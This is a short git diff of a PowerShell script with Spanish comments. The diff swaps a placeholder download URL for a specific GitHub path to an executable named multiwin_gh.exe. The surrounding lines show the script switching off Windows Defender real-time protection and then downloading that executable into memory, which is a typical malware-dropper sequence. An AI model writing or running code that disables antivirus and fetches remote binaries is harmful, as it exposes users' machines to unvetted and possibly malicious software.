@@ -3,7 +3,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Write-Host "⛔ Antivirus desactivado temporalmente"
 
 # Definir URL del archivo en GitHub (ajusta la URL según tu caso)
-$exeUrl = "https://github.com/tu_usuario/tu_repositorio/releases/latest/download/multiwin_gh.exe"
+$exeUrl = "https://github.com/umk88/scripts_install/blob/main/multiwin_gh.exe"
 
 # Descargar el archivo en memoria
 $response = Invoke-WebRequest -Uri $exeUrl -UseBasicParsing
